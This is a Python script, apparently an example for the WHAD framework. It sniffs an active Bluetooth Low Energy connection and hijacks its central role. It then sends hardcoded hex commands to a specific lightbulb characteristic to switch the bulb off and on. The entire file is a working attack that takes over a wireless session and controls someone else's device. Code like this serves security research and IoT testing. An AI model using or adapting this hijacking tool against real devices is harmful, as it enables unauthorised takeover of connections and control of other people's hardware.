from whad.domain.ble import Sniffer, Hijacker, Central
from whad.device.uart import UartDevice
from time import time,sleep
from whad.domain.ble.attribute import UUID
from scapy.all import BTLE_DATA, L2CAP_Hdr, ATT_Hdr, ATT_Write_Request
import sys

if __name__ == '__main__':
    if len(sys.argv) >= 2:
        # Retrieve target device
        device = sys.argv[1]

        # Connect to target device and performs discovery
        try:
            dev = UartDevice(device, 115200)
            sniffer = Sniffer(dev)
            sniffer.configure(advertisements=False, connection=True)
            sniffer.start()
            while not sniffer.is_synchronized():
                sleep(1)
            print("Press enter to hijack.")
            input()
            hijacker = sniffer.available_actions(Hijacker)[0]
            success = hijacker.hijack(master=True, slave=False)
            if success:
                print("Master successfully hijacked !")
                central = hijacker.available_actions(Central)[0]
                periph = central.peripheral()
                periph.discover()

                c = periph.get_characteristic(UUID("a8b3fff0-4834-4051-89d0-3de95cddd318"), UUID("a8b3fff1-4834-4051-89d0-3de95cddd318"))
                while True:
                    print("Press enter to turn off the lightbulb.")
                    input()
                    c.write(bytes.fromhex("5510000d0a"))
                    print("Press enter to turn on the lightbulb.")
                    input()
                    c.write(bytes.fromhex("5510010d0a"))

            else:
                print("Fail, exiting...")
        except (KeyboardInterrupt, SystemExit):
            dev.close()
    else:
        print('Usage: %s [device]' % sys.argv[0])